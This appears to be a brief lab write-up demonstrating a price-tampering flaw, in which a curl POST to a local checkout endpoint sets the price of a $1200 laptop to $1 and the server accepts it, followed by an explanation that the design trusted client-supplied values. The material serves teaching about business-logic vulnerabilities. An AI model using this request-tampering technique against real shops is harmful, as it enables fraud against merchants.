## Exploitation Steps
The goal is to purchase an expensive item (a $1200 laptop) for only $1 by manipulating the checkout request.

### 1. Perform a Malicious Purchase
We bypass the UI and send a direct POST request to the final checkout endpoint, setting our own price.

```bash
curl -X POST "http://127.0.0.1:8000/checkout/final" \
     -H "Content-Type: application/json" \
     -d '{"item_id": 1, "quantity": 1, "price_to_pay": 1.00}'
```


Response:

```json
{
  "status": "Success",
  "message": "You bought 1 of item 1 for $1.0"
}
```

Result: The system processed the transaction for $1.00 because the design trusted the client-provided value instead of verifying it against the database.